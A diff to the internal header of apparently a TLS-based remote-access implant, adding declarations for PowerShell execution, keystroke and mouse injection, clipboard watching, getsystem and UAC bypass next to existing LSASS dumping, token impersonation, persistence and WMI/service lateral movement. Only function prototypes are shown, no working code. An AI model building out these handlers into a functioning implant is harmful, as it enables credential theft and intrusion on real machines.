@@ -15,8 +15,8 @@
 #ifndef SHELL_INTERNAL_H
 #define SHELL_INTERNAL_H
 
-#include "config.h"
-#include "../tls/tls_client.h"
+#include "../core/config.h"
+#include "../../tls/tls_client.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -58,10 +58,19 @@ void _handle_upload       (TLS_CONTEXT *pTls, const char *filename);
 void _handle_download     (TLS_CONTEXT *pTls, const char *path);
 void _handle_persist      (TLS_CONTEXT *pTls, const char *args);
 void _handle_self_destruct(TLS_CONTEXT *pTls);
+void _handle_run_psh      (TLS_CONTEXT *pTls, const char *psCmd);
+void _handle_open_url     (TLS_CONTEXT *pTls, const char *url);
+void _handle_set_wallpaper(TLS_CONTEXT *pTls, const char *path);
+void _handle_mouse_move   (TLS_CONTEXT *pTls, const char *args);
+void _handle_type_keys    (TLS_CONTEXT *pTls, const char *text);
+void _handle_clip_watch   (TLS_CONTEXT *pTls);
 
 /* handlers_lateral.c */
 void _handle_dump_lsass        (TLS_CONTEXT *pTls);
 void _handle_token_impersonate (TLS_CONTEXT *pTls, const char *args);
+void _handle_token_revert      (TLS_CONTEXT *pTls);
+void _handle_getsystem         (TLS_CONTEXT *pTls);
+void _handle_uac_bypass        (TLS_CONTEXT *pTls, const char *args);
 void _handle_lateral_wmi       (TLS_CONTEXT *pTls, const char *args);
 void _handle_lateral_sc        (TLS_CONTEXT *pTls, const char *args);
 
